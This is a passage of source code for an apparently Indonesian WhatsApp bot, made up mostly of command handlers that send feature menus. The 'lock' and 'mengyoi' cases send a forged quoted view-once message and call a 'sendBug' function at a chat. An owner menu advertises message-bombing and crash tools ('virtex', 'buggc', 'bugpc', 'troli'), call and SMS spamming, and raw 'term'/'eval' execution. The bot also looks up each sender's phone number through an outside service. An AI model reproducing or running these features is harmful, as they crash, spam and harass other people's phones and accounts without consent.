case 'f':
case 'lock':
 ikymemek = {
  "key": {
    "fromMe": false,
    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
  },
  "message": {
    "viewOnceMessage": {
      "message": {
        "imageMessage": {
          "url": "https://mmg.whatsapp.net/d/f/AjD3dQIM5hW3UkDfnnkice-eMcsMJJALEcgD9HnDGZEp.enc",
          "mimetype": "image/jpeg",
          "fileSha256": "aR3vWUsV9VZUiR+agYok8oM4UHiuhqEShMpQ6SgY9WM=",
          "fileLength": "675",
          "height": 41,
          "width": 52,
          "mediaKey": "6RDG8T+jOb0RfleWzLTclsaVn0EGRA/v78dnS+Y4S+o=",
          "fileEncSha256": "idNxqNtCaHRxuN+AX0uakPrBuiyvx84IksPUYMYgs7Y=",
          "directPath": "/v/t62.7118-24/13810909_985978368802545_7608967834334288292_n.enc?ccb=11-4&oh=359274a24041d97e91597ad1fb40e784&oe=61595B99",
          "mediaKeyTimestamp": "1630826390",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkANAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAApgAAAAAAAAAAAf/EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AK//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8AT//Z",
          "viewOnce": true
        }
      }
    }
  },
  "messageTimestamp": "1630826389",
  "status": "SERVER_ACK",
  "mediaData": {
    "localPath": "/data/user/0/com.gbwhatsapp/files/ViewOnce/IMG-20210905-WA0047.jpg"
  }
}
itsmevall.sendMessage(from, { "degreesLatitude": '', "degreesLongitude": '', "jpegThumbnail": iye}, MessageType.location, {quoted: ikymemek})
           break          
case 'mengyoi':
if (!mek.key.fromMe) return;
sendBug(from)
break
case 'readall':
              totalchat.map( async ({ jid }) => {
              await itsmevall.chatRead(jid)
})
              reply(`\`\`\`Berhasil membaca Seluruh Chat !\`\`\``)
              console.log(totalchat.length)
              break	

///𝑃𝐼𝑅𝑇𝐸𝐾
                          case 'bucinstick':
                case 'bucinsticker':{
         
                    var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    var wifegerak = ano.split('\n')
                    var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    var isGif = wifegerakx.endsWith('.gif') ? true : false
                    if (!isGif) {
                    var ngebuff = await getBuffer(wifegerakx)
                    var media = getRandom('.png')
                    fs.writeFileSync(media, ngebuff)
                    await ffmpeg(`${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                    if (error) return reply(mess.error.api)
									 itsmevall.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
								
                                    fs.unlinkSync(media)	
									fs.unlinkSync(`./sticker/${sender}.webp`)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    } else {
                     var ngebuff = await getBuffer(wifegerakx)
                 	let media = `./sticker/${sender}.gif`
                    fs.writeFileSync(media, ngebuff)
					reply(mess.wait)
                        await ffmpeg(`${media}`)
							.inputFormat(media.split('.')[4])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(err)
								fs.unlinkSync(media)
								let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(mess.error.api)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
									if (error) return reply(mess.error.api)
									 itsmevall.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})
									
                                    fs.unlinkSync(media)
									fs.unlinkSync(`./sticker/${sender}.webp`)
                                })
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(`./sticker/${sender}.webp`)
                    }
                    }
                    break
              case 'dadu':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			itsmevall.sendMessage(from, damdu, sticker, {quoted: mek})
			break 
case 'kerang':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *KERANG AJAIB* ]    
│• ${prefix}siapakah <teks>
│• ${prefix}kapankan <teks>
│• ${prefix}adakah <teks>
│• ${prefix}cekme <teks>
│• ${prefix}jadian <teks>
│• ${prefix}ngewe <teks>
│• ${prefix}bucin <teks>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeker}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'downloader':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *DOWNLOADER* ]  
│• ${prefix}play <query>
│• ${prefix}ytmp4 <link> (limit)
│• ${prefix}ytmp3 <link> (limit)
│• ${prefix}video <query> (limit)
│• ${prefix}instagram <link> (limit)
│• ${prefix}twitter <link> (limit)
│• ${prefix}facebook link (limit)
│• ${prefix}tiktokdl <link> (limit)
│• ${prefix}tiktokmusic <link> (limit)
│• ${prefix}tiktokmusic2 <link> (limit)
│• ${prefix}tiktokwm2 <link> (limit)
│• ${prefix}ytsearch <query> (limit)
│• ${prefix}igdl <link> (limit)
│• ${prefix}fbdl <link> (limit)
│• ${prefix}brainly <query> (limit)
│• ${prefix}lirik <query> (limit)
│• ${prefix}tiktoknowm <link> (limit)
│• ${prefix}pinterest <query> (limit)
│• ${prefix}spotifysearch <query> (limit)
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakedown}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'sesion':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *BAILEYS* ]
│• ${prefix}jadibot (limit)
│• ${prefix}stopjadibot
│• ${prefix}listbot
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakebil}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'about':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *ABOUT* ]
│• ${prefix}rules/syarat penggunaan bot
│• ${prefix}menu
│• ${prefix}ping
│• ${prefix}status
│• ${prefix}delete
│• ${prefix}owner
│• ${prefix}report (keluhan)
│• ${prefix}getpic
│• ${prefix}runtime
│• ${prefix}listgroup
│• ${prefix}sider
│• ${prefix}sewa
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakele}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'group':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭──[ *MENU GROUP* ]
│• ${prefix}grup (buka/tutup)
│• ${prefix}promote (@tag)
│• ${prefix}demote (@tag)
│• ${prefix}setdesc
│• ${prefix}setname (@tag)
│• ${prefix}nsfw (1/0)
│• ${prefix}kick (@tag)
│• ${prefix}add (@+62)
│• ${prefix}getbio (@tag)
│• ${prefix}getname (@tag)
│• ${prefix}reminder (@tag)
│• ${prefix}listonline
│• ${prefix}sider (reply pesan bot)
│• ${prefix}antilink (on|off)
│• ${prefix}tod (tantangan/kejujuran)
│• ${prefix}tospam (jumlah)
│• ${prefix}antihidetag (on|off)
│• ${prefix}antiviewonce (on|off)
│• ${prefix}antivirtex (on|off)
│• ${prefix}autojoin (on|off)
│• ${prefix}kickarea (on|off)
└──────────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakele}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'fitur':
case 'ownermenu':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "6289503657396@s.whatsapp.net"
        dtod = '6289503657396'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *OWNER* ]
│• ${prefix}off
│• ${prefix}isbaileys
│• ${prefix}banchat (on/off)
│• ${prefix}unbanchat (on/off)
│• ${prefix}listbc
│• ${prefix}setcmd (reply sticker)
│• ${prefix}delcmd (reply sticker)
│• ${prefix}listcmd
│• ${prefix}restart
│• ${prefix}antidelete (on|off)
│• ${prefix}autoketik (on|off)
│• ${prefix}autoread (gc in / gc off)
│• ${prefix}autovn (on|off)
│• ${prefix}anticall (on|off)
│• ${prefix}getcaption (reply)
│• ${prefix}bugkatalog
│• ${prefix}buggc (id grup)
│• ${prefix}bugpc (only pc)
│• ${prefix}troliv1 (teks)
│• ${prefix}troliv2 (total)
│• ${prefix}virtex (total
│• ${prefix}on
│• ${prefix}spamcall (no hp)
│• ${prefix}spamsms (no hp)
│• ${prefix}addprem (@user)
│• ${prefix}delprem (@user)
│• ${prefix}listprem
│• ${prefix}status
│• ${prefix}setthumb (reply img)
│• ${prefix}settarget (+62)
│• ${prefix}setfakeimg (reply img)
│• ${prefix}setreply (reply img)
│• ${prefix}hacked (nama)
│• ${prefix}setprefix 
│• ${prefix}mode </public-self/>
│• ${prefix}term <code>
│• ${prefix}eval <code>
│• ${prefix}colongsw (reply sw)
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeown}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'soundmenu':
fs.readFileSync('./media/image/sound.jpg')
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "6289503657396@s.whatsapp.net"
        dtod = '6289503657396'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			menu = `╭─[ *SOUND* ]
│• ${prefix}sound1
│• ${prefix}sound2
│• ${prefix}sound3
│• ${prefix}sound4
│• ${prefix}sound5
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeown}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'THANKS'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break//MENU SOUND BY FAUZI !!
case 'sound1':
sound1 = fs.readFileSync('./sound1.mp3')
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
itsmevall.sendMessage(from, sound1, audio, { quoted: mek, mimetype: 'audio/mp4', ptt:true })
break//SUBREK YT HY FAUZI
case 'sound2':
sound2 = fs.readFileSync('./sound2.mp3')
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
itsmevall.sendMessage(from, sound2, audio, { quoted: mek, mimetype: 'audio/mp4', ptt:true })
break//SOUND SHOLAWAT
case 'sound3':
sound3 = fs.readFileSync('./sound3.mp3')
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
itsmevall.sendMessage(from, sound3, audio, { quoted: mek, mimetype: 'audio/mp4', ptt:true })
break//By ZyyXtrime
case 'sound4':
sound4 = fs.readFileSync('./sound4.mp3')
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
itsmevall.sendMessage(from, sound4, audio, { quoted: mek, mimetype: 'audio/mp4', ptt:true })
break//By Fauziiiii
case 'wibu':
case 'bawang':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *WIBU* ]
│• ${prefix}yuri (limit)
│• ${prefix}hentai (limit)
│• ${prefix}anal (limit)
│• ${prefix}eroneko (limit)
│• ${prefix}lesbian (limit)
│• ${prefix}kitsune (limit)
│• ${prefix}bj (limit)
│• ${prefix}pussy (limit)
│• ${prefix}wallpaper (limit)
│• ${prefix}neko2 (limit)
│• ${prefix}baka (limit)
│• ${prefix}slap (limit)
│• ${prefix}poke (limit)
│• ${prefix}keta (limit)
│• ${prefix}awoo (limit)
│• ${prefix}blowjob (limit)
│• ${prefix}megumin (limit)
│• ${prefix}neko (limit)
│• ${prefix}trapnime (limit)
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakewibu}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'upload':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *UPLOAD* ]
│• ${prefix}upswteks <teks>
│• ${prefix}upswlokasi
│• ${prefix}upswsticker
│• ${prefix}upswimage (reply img)
│• ${prefix}upswvideo (reply video)
│• ${prefix}upswgif (reply gif)
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeup}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'other':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `*╭─[ OTHER ]*
│• ${prefix}ping
│• ${prefix}inspect <link>
│• ${prefix}join <link>
│• ${prefix}dadu
│• ${prefix}bilangangka <number>
│• ${prefix}kalkulator <angka>
│• ${prefix}pantun (limit)
│• ${prefix}quote (limit)
│• ${prefix}nuliskanan <teks>
│• ${prefix}nuliskiri <teks>
│• ${prefix}foliokiri <teks>
│• ${prefix}foliokanan teks
│• ${prefix}ss <link>
│• ${prefix}liriklagu <query>
│• ${prefix}artinama <name>
│• ${prefix}debug (limit)
│• ${prefix}debug2 (limit)
│• ${prefix}infogempa (limit)
│• ${prefix}resepmasakan (limit)
│• ${prefix}chat (62|P) (limit)
│• ${prefix}caripesan <query>
│• ${prefix}get url (limit)
│• ${prefix}githubstalk <query>
│• ${prefix}ytsearch <query>
│• ${prefix}igstalk <query>
│• ${prefix}tiktokstalk <query>
│• ${prefix}play <query>
│• ${prefix}video <query>
│• ${prefix}igstory <username>
│• ${prefix}twitter <link>
│• ${prefix}tiktok <link>
│• ${prefix}fb <link>
│• ${prefix}brainly <query>
│• ${prefix}image <query>
│• ${prefix}anime <random>
│• ${prefix}pinterest <query>
│• ${prefix}komiku <query>
│• ${prefix}lirik <query>
│• ${prefix}chara <query>
│• ${prefix}playstore <query>
│• ${prefix}otaku <query>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeote}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'maker':
if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *MAKER* ]
│• ${prefix}fdeface
│• ${prefix}fancytext <teks>
│• ${prefix}emoji
│• ${prefix}halloween <teks>
│• ${prefix}vampire <teks>
│• ${prefix}codetxt <teks>
│• ${prefix}matrix <teks>
│• ${prefix}googletxt <teks>
│• ${prefix}spiderman <teks>
│• ${prefix}express
│• ${prefix}maker2d2 <teks>
│• ${prefix}maker2d3 <teks>
│• ${prefix}maker2d4 <teks>
│• ${prefix}maker3d <teks>
│• ${prefix}golden <teks>
│• ${prefix}flower <teks>
│• ${prefix}dance
│• ${prefix}wooden <teks>
│• ${prefix}burn <teks>
│• ${prefix}glow <teks>
│• ${prefix}summer <teks>
│• ${prefix}neon <teks>
│• ${prefix}coffeecup2 <teks>
│• ${prefix}coffeecup <teks>
│• ${prefix}battlefield <teks|teks>
│• ${prefix}googletxt2 <teks>
│• ${prefix}transformer <teks>
│• ${prefix}nulis <teks>
│• ${prefix}text3d <teks>
│• ${prefix}warrior <teks>
│• ${prefix}blackpink <teks>
│• ${prefix}neon <teks>
│• ${prefix}greenneon <teks>
│• ${prefix}advanceglow <teks>
│• ${prefix}futureneon <teks>
│• ${prefix}sandwriting <teks>
│• ${prefix}sandsummer <teks>
│• ${prefix}sandengraved <teks>
│• ${prefix}metaldark <teks>
│• ${prefix}neonlight <teks>
│• ${prefix}holographic <teks>
│• ${prefix}text1917 <teks>
│• ${prefix}minion <teks>
│• ${prefix}deluxesilver <teks>
│• ${prefix}newyearcard <teks>
│• ${prefix}bloodfrosted <teks>
│• ${prefix}halloween <teks>
│• ${prefix}jokerlogo <teks>
│• ${prefix}fireworksparkle <teks>
│• ${prefix}natureleaves <teks>
│• ${prefix}bokeh <teks>
│• ${prefix}toxic <teks>
│• ${prefix}strawberry <teks>
│• ${prefix}box3d <teks>
│• ${prefix}roadwarning <teks>
│• ${prefix}breakwall <teks>
│• ${prefix}icecold <teks>
│• ${prefix}luxury <teks>
│• ${prefix}cloud <teks>
│• ${prefix}summersand <teks>
│• ${prefix}horrorblood <teks>
│• ${prefix}thunder <teks>
│• ${prefix}pornhub <teks>
│• ${prefix}glitch <teks>
│• ${prefix}avenger <teks>
│• ${prefix}space <teks>
│• ${prefix}ninjalogo <teks>
│• ${prefix}marvelstudio <teks>
│• ${prefix}lionlogo <teks>
│• ${prefix}wolflogo <teks>
│• ${prefix}steel3d <teks>
│• ${prefix}wallgravity <teks>
│• ${prefix}shadow <teks>
│• ${prefix}cup <teks>
│• ${prefix}cup1 <teks>
│• ${prefix}romance <teks>
│• ${prefix}smoke <teks>
│• ${prefix}burnpaper <teks>
│• ${prefix}lovemessage <teks>
│• ${prefix}undergrass <teks>
│• ${prefix}love <teks>
│• ${prefix}coffe <teks>
│• ${prefix}woodheart <teks>
│• ${prefix}woodenboard <teks>
│• ${prefix}summer3d <teks>
│• ${prefix}wolfmetal <teks>
│• ${prefix}nature3d <teks>
│• ${prefix}underwater <teks>
│• ${prefix}golderrose <teks>
│• ${prefix}summernature <teks>
│• ${prefix}letterleaves <teks>
│• ${prefix}glowingneon <teks>
│• ${prefix}fallleaves <teks>
│• ${prefix}flamming <teks>
│• ${prefix}harrypotter <teks>
│• ${prefix}carvedwood <teks>
│• ${prefix}arcade8bit <teks>
│• ${prefix}battlefield4 <teks>
│• ${prefix}pubg <teks>
│• ${prefix}wetglass <teks>
│• ${prefix}multicolor3d <teks>
│• ${prefix}watercolor <teks>
│• ${prefix}luxurygold <teks>
│• ${prefix}galaxywallpaper <teks>
│• ${prefix}lighttext <teks>
│• ${prefix}beautifulflower <teks>
│• ${prefix}puppycute <teks>
│• ${prefix}royaltext <teks>
│• ${prefix}heartshaped <teks>
│• ${prefix}birthdaycake <teks>
│• ${prefix}galaxystyle <teks>
